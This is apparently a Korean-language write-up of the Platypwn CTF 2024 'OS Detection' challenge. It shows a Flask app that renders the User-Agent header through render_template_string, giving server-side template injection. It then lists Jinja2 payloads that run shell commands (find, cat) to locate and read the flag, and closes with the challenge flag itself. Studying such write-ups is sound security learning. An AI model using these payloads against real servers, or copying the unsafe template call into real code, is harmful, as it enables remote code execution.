---
title: Platypwn CTF 2024 Write-Up
published: 2024-12-11
description: Platypwn CTF 2024 Write-Up
tags: [CTF]
category: Hacking
draft: false
---

# OS Detection #
문제에 대한 코드는 다음과 같이 User Agent에 대한 데이터를 파싱한 다음, 문자열에서 OS에 대한 종류에 대한 값을 가져온다. 그리고 ```render_template_string``` 함수를 통해서 문자열을 user_agent_hint에 반환한다. 여기서 ```render_template_string``` 함수는  ```{{ }}```안에 입력된 코드를 해석하므로, SSTI 취약점이 발생한다.

```
from flask import Flask, request, render_template, render_template_string
from ua_parser import user_agent_parser

app = Flask(__name__)

@app.route("/")
def home():
    user_agent = request.headers.get('User-Agent')
    try:
        parsed_string = user_agent_parser.Parse(user_agent)
        family = parsed_string['os']['family']
        user_agent_hint = render_template_string(user_agent)
        return render_template('index.html', os=family, user_agent=user_agent_hint)
    except Exception as e:
        return render_template('failure.html', error=str(e))
    
@app.route("/source")
def source():
    code = open(__file__).read()
    return render_template_string("<pre>{{ code }}</pre>", code=code)
    

if __name__ == "__main__":
    # No debug, that would be insecure!
    #app.run(debug=True)
    app.run()
```

그래서 SSTI 취약점을 이용해서 RCE Payload를 실행하면 flag를 얻을 수 있다. 하지만 flag에 대한 파일 위치를 모르기 떄문에 경로를 찾아야 된다.

```
{{config.__class__.__init__.__globals__['os'].popen('find / -name "flag*" 2>/dev/null').read()}}
```
이러한 RCE 이용해서 flag에 대한 경로를 구할 수 있다. 이 중에서 /app/flag/flag.txt 파일을 읽었다.

```
{{config.__class__.__init__.__globals__['os'].popen('cat /app/flag/flag.txt').read()}}
```

flag는 다음과 같다.

PP{h4ck3r-OS-d3t3ct3d::Q3HIY8GDEVv2}